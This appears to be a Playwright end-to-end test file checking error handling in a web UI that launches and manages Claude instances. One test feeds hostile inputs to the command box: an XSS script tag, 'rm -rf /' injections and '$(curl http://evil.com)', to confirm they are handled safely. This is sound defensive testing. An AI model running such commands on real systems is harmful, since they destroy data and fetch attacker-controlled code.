import { test, expect, Page } from '@playwright/test';

/**
 * Error Scenario E2E Tests for Claude Instance Management
 * 
 * Tests comprehensive error handling, edge cases, and recovery scenarios
 */

test.describe('Claude Instance Management - Error Scenarios & Edge Cases', () => {
  let page: Page;

  test.beforeEach(async ({ browser }) => {
    const context = await browser.newContext();
    page = await context.newPage();
    
    // Clean up any existing instances
    try {
      await fetch('http://localhost:3333/api/v1/claude/instances', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' }
      });
    } catch (error) {
      console.log('Cleanup error (expected):', error);
    }
    
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    await page.waitForSelector('[data-testid="claude-instance-manager"]');
  });

  test.afterEach(async () => {
    // Cleanup instances after each test
    try {
      const response = await fetch('http://localhost:3333/api/v1/claude/instances');
      if (response.ok) {
        const data = await response.json();
        if (data.success && data.instances) {
          for (const instance of data.instances) {
            await fetch(`http://localhost:3333/api/v1/claude/instances/${instance.id}`, {
              method: 'DELETE'
            });
          }
        }
      }
    } catch (error) {
      console.log('Cleanup error:', error);
    }
    
    await page.close();
  });

  test('Backend unavailable during initial load', async () => {
    // This test would require actual backend control
    // For now, we test the UI behavior when fetch fails
    
    // Navigate to page when backend might be unavailable
    await page.goto('/');
    await page.waitForSelector('[data-testid="claude-instance-manager"]');
    
    // UI should still render with error state
    await expect(page.locator('h2')).toContainText('Claude Instance Manager');
    
    // Should show appropriate error message or empty state
    const errorElement = page.locator('.error');
    const noInstancesElement = page.locator('.no-instances');
    
    // Either error message or no-instances message should be visible
    const hasError = await errorElement.count() > 0;
    const hasNoInstances = await noInstancesElement.count() > 0;
    
    expect(hasError || hasNoInstances).toBeTruthy();
    
    // Buttons should still be visible for retry
    await expect(page.locator('.btn-prod')).toBeVisible();
  });

  test('Invalid instance ID handling', async () => {
    // Create a valid instance first
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    // Try to manipulate the instance ID to an invalid format
    // This simulates what could happen with corrupted data or XSS attempts
    await page.evaluate(() => {
      const instanceCard = document.querySelector('[data-testid="instance-card"]');
      if (instanceCard) {
        // Try various invalid ID formats
        instanceCard.setAttribute('data-instance-id', 'invalid-id');
      }
    });
    
    // Click on the manipulated instance card
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    await instanceCard.click();
    
    // Should show error or not select the instance
    const errorElement = page.locator('.error');
    if (await errorElement.count() > 0) {
      const errorText = await errorElement.textContent();
      expect(errorText).toContain('Invalid instance ID');
    }
    
    // Terminal should not show output for invalid instance
    const terminalOutput = page.locator('[data-testid="terminal-output"]');
    if (await terminalOutput.count() > 0) {
      const outputText = await terminalOutput.textContent();
      expect(outputText).not.toContain('undefined');
    }
  });

  test('Empty command input handling', async () => {
    // Create and select instance
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    await instanceCard.click();
    await expect(page.locator('.connection-status')).toHaveClass(/connected/, { timeout: 10000 });
    
    // Try sending empty command
    const sendButton = page.locator('[data-testid="send-command-button"]');
    await sendButton.click();
    
    // Should not send anything, input should remain empty
    const commandInput = page.locator('[data-testid="command-input"]');
    await expect(commandInput).toHaveValue('');
    
    // Try sending whitespace-only command
    await commandInput.fill('   ');
    await sendButton.click();
    
    // Should not send whitespace, input should be cleared or remain unchanged
    const inputValue = await commandInput.inputValue();
    expect(inputValue.length).toBe(0);
  });

  test('Malformed command injection attempts', async () => {
    // Create and select instance
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    await instanceCard.click();
    await expect(page.locator('.connection-status')).toHaveClass(/connected/, { timeout: 10000 });
    
    // Try various potentially malicious commands
    const maliciousCommands = [
      '<script>alert("xss")</script>',
      '"; rm -rf /; echo "',
      '$(curl http://evil.com)',
      '`rm -rf /`',
      '\\x00\\x01\\x02'
    ];
    
    for (const maliciousCommand of maliciousCommands) {
      await page.fill('[data-testid="command-input"]', maliciousCommand);
      await page.click('[data-testid="send-command-button"]');
      
      // Command should be handled safely
      await expect(page.locator('[data-testid="command-input"]')).toHaveValue('');
      
      // Page should not be affected by XSS
      await expect(page.locator('h2')).toContainText('Claude Instance Manager');
      
      // No JavaScript execution should occur
      const alertDialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
      const dialog = await alertDialogPromise;
      expect(dialog).toBeNull();
    }
  });

  test('Rapid clicking prevention (debouncing)', async () => {
    const createButton = page.locator('.btn-prod');
    
    // Click create button multiple times rapidly
    for (let i = 0; i < 5; i++) {
      await createButton.click({ force: true });
      await page.waitForTimeout(100); // Very fast clicking
    }
    
    // Should only create one instance despite multiple clicks
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 20000 });
    
    // Wait a bit longer to ensure no additional instances are created
    await page.waitForTimeout(3000);
    
    const instanceCards = page.locator('[data-testid="instance-card"]');
    const count = await instanceCards.count();
    
    // Should have only created one instance
    expect(count).toBeLessThanOrEqual(1);
  });

  test('Instance termination during active connection', async () => {
    // Create instance and establish connection
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    const instanceId = await instanceCard.getAttribute('data-instance-id');
    await instanceCard.click();
    
    await expect(page.locator('.connection-status')).toHaveClass(/connected/, { timeout: 10000 });
    
    // Start sending commands
    await page.fill('[data-testid="command-input"]', 'sleep 10');
    await page.click('[data-testid="send-command-button"]');
    
    // Immediately terminate the instance while command is running
    const terminateButton = page.locator(`[data-testid="disconnect-button-${instanceId}"]`);
    await terminateButton.click();
    
    // Instance should disappear from UI
    await expect(instanceCard).not.toBeVisible({ timeout: 10000 });
    
    // Should return to no-instances state
    await expect(page.locator('.no-instances')).toBeVisible();
    
    // No selected instance should remain
    await expect(page.locator('.instance-item.selected')).toHaveCount(0);
    
    // Terminal output area should show no-selection message
    const noSelectionText = page.locator('.no-selection');
    await expect(noSelectionText).toBeVisible();
  });

  test('Browser refresh during instance creation', async () => {
    // Start creating an instance
    await page.click('.btn-prod');
    
    // Immediately refresh the page
    await page.waitForTimeout(1000); // Wait a bit for creation to start
    await page.reload();
    await page.waitForLoadState('networkidle');
    await page.waitForSelector('[data-testid="claude-instance-manager"]');
    
    // UI should recover gracefully
    await expect(page.locator('h2')).toContainText('Claude Instance Manager');
    await expect(page.locator('.launch-buttons')).toBeVisible();
    
    // Should be able to create instance after refresh
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    await expect(instanceCard).toBeVisible();
  });

  test('Memory exhaustion simulation', async () => {
    // Create instance
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    await instanceCard.click();
    await expect(page.locator('.connection-status')).toHaveClass(/connected/, { timeout: 10000 });
    
    // Try to overwhelm the system with rapid command execution
    const rapidCommands = Array.from({ length: 100 }, (_, i) => `echo "Command ${i}"`);
    
    for (const command of rapidCommands) {
      try {
        await page.fill('[data-testid="command-input"]', command);
        await page.click('[data-testid="send-command-button"]');
        await page.waitForTimeout(50); // Very fast execution
      } catch (error) {
        // Some commands might fail due to rate limiting, which is expected
        console.log('Command failed (expected under stress):', error);
      }
    }
    
    // UI should remain responsive despite the stress test
    await expect(page.locator('[data-testid="command-input"]')).toBeEnabled();
    await expect(instanceCard).toHaveClass(/selected/);
    
    // Should be able to send a normal command
    await page.fill('[data-testid="command-input"]', 'echo "recovery test"');
    await page.click('[data-testid="send-command-button"]');
    await expect(page.locator('[data-testid="command-input"]')).toHaveValue('');
  });

  test('Invalid server response handling', async () => {
    // Test what happens when server returns malformed data
    // This would require mocking the API responses in a real test environment
    
    // For now, test UI resilience when API calls fail
    await page.route('**/api/v1/claude/instances', route => {
      route.fulfill({
        status: 500,
        contentType: 'text/html',
        body: 'Internal Server Error'
      });
    });
    
    await page.click('.btn-prod');
    
    // Should show error state
    const errorElement = page.locator('.error');
    await expect(errorElement).toBeVisible({ timeout: 5000 });
    
    const errorText = await errorElement.textContent();
    expect(errorText).toBeTruthy();
    
    // UI should remain stable
    await expect(page.locator('h2')).toContainText('Claude Instance Manager');
    await expect(page.locator('.launch-buttons')).toBeVisible();
  });

  test('Connection timeout handling', async () => {
    // Create instance
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    await instanceCard.click();
    
    // Wait for connection attempt
    await page.waitForTimeout(2000);
    
    // Connection status should show appropriate state
    const connectionStatus = page.locator('.connection-status');
    const statusText = await connectionStatus.textContent();
    
    // Should show either connected, connecting, or error state
    expect(statusText).toBeTruthy();
    expect(statusText.length).toBeGreaterThan(0);
    
    // If connection fails, error should be displayed appropriately
    const errorElement = page.locator('.error');
    const hasError = await errorElement.count() > 0;
    
    if (hasError) {
      const errorText = await errorElement.textContent();
      expect(errorText).toBeTruthy();
    }
  });

  test('Browser tab focus/blur behavior', async () => {
    // Create instance and establish connection
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    await instanceCard.click();
    await expect(page.locator('.connection-status')).toHaveClass(/connected/, { timeout: 10000 });
    
    // Simulate tab focus loss
    await page.evaluate(() => {
      window.dispatchEvent(new Event('blur'));
      document.dispatchEvent(new Event('visibilitychange'));
    });
    
    await page.waitForTimeout(1000);
    
    // Simulate tab focus return
    await page.evaluate(() => {
      window.dispatchEvent(new Event('focus'));
      document.dispatchEvent(new Event('visibilitychange'));
    });
    
    // UI should remain functional
    await expect(page.locator('[data-testid="command-input"]')).toBeEnabled();
    await expect(instanceCard).toHaveClass(/selected/);
    
    // Should be able to send command after focus return
    await page.fill('[data-testid="command-input"]', 'echo "focus test"');
    await page.click('[data-testid="send-command-button"]');
    await expect(page.locator('[data-testid="command-input"]')).toHaveValue('');
  });

  test('Large instance name handling', async () => {
    // This test would require modifying the backend to support custom instance names
    // For now, test that long instance IDs are handled properly
    
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
    
    const instanceCard = page.locator('[data-testid="instance-card"]').first();
    const instanceId = await instanceCard.getAttribute('data-instance-id');
    
    // Instance ID should be properly truncated in display
    const instanceIdDisplay = instanceCard.locator('.instance-id');
    const displayText = await instanceIdDisplay.textContent();
    
    // Should show truncated ID
    expect(displayText).toContain(instanceId?.slice(0, 8));
    
    // Full ID should still be available in data attribute
    expect(instanceId).toMatch(/^claude-\d+$/);
  });

  test('Concurrent instance operations', async () => {
    // Create multiple instances rapidly
    const createButtons = ['.btn-prod', '.btn-skip-perms', '.btn-skip-perms-c'];
    
    // Click all buttons nearly simultaneously
    const clickPromises = createButtons.map(selector => page.click(selector));
    await Promise.all(clickPromises);
    
    // Wait for instances to appear
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 20000 });
    
    // Should handle concurrent creation gracefully
    const instanceCards = page.locator('[data-testid="instance-card"]');
    const count = await instanceCards.count();
    
    // Should create instances (may be fewer than 3 due to rate limiting)
    expect(count).toBeGreaterThan(0);
    expect(count).toBeLessThanOrEqual(3);
    
    // All created instances should be valid
    for (let i = 0; i < count; i++) {
      const card = instanceCards.nth(i);
      const instanceId = await card.getAttribute('data-instance-id');
      expect(instanceId).toMatch(/^claude-\d+$/);
    }
  });

  test('CSS/styling integrity under errors', async () => {
    // Simulate CSS loading failure
    await page.addStyleTag({
      content: `
        .claude-instance-manager { display: none !important; }
      `
    });
    
    // Even with CSS issues, core functionality should work
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    
    // Element should exist even if hidden by CSS
    const manager = page.locator('[data-testid="claude-instance-manager"]');
    await expect(manager).toHaveCount(1);
    
    // Remove the problematic CSS
    await page.evaluate(() => {
      const style = document.querySelector('style');
      if (style) style.remove();
    });
    
    // Should become visible again
    await expect(manager).toBeVisible();
    
    // Should be able to create instance
    await page.click('.btn-prod');
    await page.waitForSelector('[data-testid="instance-card"]', { timeout: 15000 });
  });
});